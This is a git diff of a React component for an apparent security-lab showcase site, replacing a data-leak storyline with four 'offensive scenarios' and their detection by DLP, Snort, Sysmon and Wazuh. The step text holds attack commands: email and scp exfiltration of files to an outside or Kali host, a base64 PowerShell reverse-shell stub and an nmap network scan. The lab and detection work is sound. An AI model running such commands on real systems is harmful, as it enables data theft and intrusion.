@@ -1,3 +1,4 @@
+// Updated: Sprint 1 & Sprint 2 — v2.0
 import { motion, useInView, AnimatePresence } from "framer-motion";
 import { useRef, useState, useEffect } from "react";
 import SectionHeading from "./SectionHeading";
@@ -7,68 +8,47 @@ import ScrollReveal from "./ScrollReveal";
 const STEPS = [
   {
     id: 0,
-    time: "T+0 s",
-    actor: "Finance Analyst",
-    action: "Attaches sensitive budget file (IBAN, forecasts) to outbound email",
-    layer: "Endpoint",
+    time: "Scénario 1",
+    actor: "Email Exfil",
+    action: "swaks --to external@gmail.com --attach salary-report.txt. emailmonitor bloque si destination externe.",
+    layer: "EMAIL",
     color: "#ef4444",
-    risk: 15,
+    risk: 85,
   },
   {
     id: 1,
-    time: "T+2 s",
-    actor: "DLP Agent",
-    action: "Intercepts file access — IBAN regex + fingerprint match — classified Sensitive",
-    layer: "DLP",
+    time: "Scénario 2",
+    actor: "SCP Exfil",
+    action: "scp confidential.xlsx kali@192.168.100.50:/tmp/. networkmonitor détecte connexion + fichier.",
+    layer: "NETWORK",
     color: "#f59e0b",
-    risk: 40,
+    risk: 90,
   },
   {
     id: 2,
-    time: "T+3 s",
-    actor: "Snort IDS",
-    action: "Flags anomalous outbound SMTP — payload exceeds user baseline — sid:100047",
-    layer: "Network",
-    color: "#06b6d4",
-    risk: 60,
+    time: "Scénario 3",
+    actor: "Reverse Shell",
+    action: "powershell -e <base64>. Sysmon EventID 1 détecté. Wazuh lève une alerte CRITICAL.",
+    layer: "PROCESS",
+    color: "#a855f7",
+    risk: 100,
   },
   {
     id: 3,
-    time: "T+5 s",
-    actor: "Wazuh SIEM",
-    action: "Correlates DLP event + Snort alert — Rule 100401 triggers on same source IP",
-    layer: "SOC",
-    color: "#a855f7",
-    risk: 78,
-  },
-  {
-    id: 4,
-    time: "T+6 s",
-    actor: "Risk Engine",
-    action: "Composite score: Content(25) + Context(20) + Behavior(25) + Network(15) + Identity(15) = 87/100",
-    layer: "Scoring",
-    color: "#3b82f6",
-    risk: 87,
-  },
-  {
-    id: 5,
-    time: "T+8 s",
-    actor: "Governance",
-    action: "Escalation triggered — transfer blocked — manager notified — forensic snapshot taken",
-    layer: "Response",
-    color: "#10b981",
-    risk: 87,
+    time: "Scénario 4",
+    actor: "Nmap Recon",
+    action: "nmap -sS -sV 192.168.100.0/24. Snort détecte le scan réseau. Alerte Wazuh.",
+    layer: "NETWORK",
+    color: "#06b6d4",
+    risk: 60,
   },
 ];
 
 /* ── SVG icon paths for layer badges ── */
 const LAYER_ICONS = {
-  Endpoint: "M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z",
-  DLP: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z",
-  Network: "M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.14 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0",
-  SOC: "M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z",
-  Scoring: "M13 10V3L4 14h7v7l9-11h-7z",
-  Response: "M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z",
+  EMAIL: "M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z",
+  NETWORK: "M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.14 0M1.394 9.393c5.857-5.858 15.355-5.858 21.213 0",
+  PROCESS: "M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2z",
 };
 
 /* ── Animated Risk Gauge ── */
@@ -131,12 +111,10 @@ function RiskGauge({ value, color }) {
 /* ── Animated Scene: visual flow User -> DLP -> Network -> SIEM -> Engine -> Blocked ── */
 function SceneVisualization({ activeStep }) {
   const nodes = [
-    { label: "User PC", x: 40, color: "#ef4444" },
-    { label: "DLP Agent", x: 190, color: "#f59e0b" },
-    { label: "Network", x: 340, color: "#06b6d4" },
-    { label: "Wazuh", x: 490, color: "#a855f7" },
-    { label: "Risk Engine", x: 640, color: "#3b82f6" },
-    { label: "Blocked", x: 790, color: "#10b981" },
+    { label: "Exécution Attaque", x: 40, color: "#ef4444" },
+    { label: "Détection DLP/Snort", x: 290, color: "#f59e0b" },
+    { label: "Corrélation Wazuh", x: 540, color: "#a855f7" },
+    { label: "Blocage & Alerte", x: 790, color: "#10b981" },
   ];
 
   return (
@@ -267,9 +245,9 @@ export default function RiskScenario() {
       <div className="section-container">
         <ScrollReveal>
           <SectionHeading
-            label="Threat Scenario"
-            title="Enterprise Risk Scenario"
-            subtitle="Live incident simulation — watch how layered detection contains a data breach in under 10 seconds."
+            label="Offensive Scenarios"
+            title="Validation de l'Architecture"
+            subtitle="Démonstration des 4 scénarios d'attaques réelles testés et bloqués par le SOC."
           />
         </ScrollReveal>
 
@@ -282,7 +260,7 @@ export default function RiskScenario() {
               </svg>
             </div>
             <p className="flex-1 text-sm text-gray-400">
-              <span className="font-medium text-white">Scenario:</span> Finance analyst sends sensitive budget file (IBAN, forecasts) to personal email — classified <span className="font-semibold text-cyber-amber">Sensitive</span>.
+              <span className="font-medium text-white">Scénarios Offensifs:</span> 4 attaques réelles simulées depuis Kali Linux ou en interne pour tester la détection et la réponse du DLP.
             </p>
             <button
               onClick={handleReplay}
@@ -389,8 +367,8 @@ export default function RiskScenario() {
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                   </svg>
                   <div>
-                    <p className="text-sm font-semibold text-emerald-300">Exfiltration Blocked — Incident Contained</p>
-                    <p className="text-xs text-gray-400">Full detection-to-response in under 10 seconds. Forensic evidence preserved, GDPR compliance maintained.</p>
+                    <p className="text-sm font-semibold text-emerald-300">Scénarios Validés — Alertes Remontées</p>
+                    <p className="text-xs text-gray-400">Toutes les attaques ont été détectées, bloquées ou remontées vers le dashboard SOC Wazuh.</p>
                   </div>
                 </motion.div>
               )}
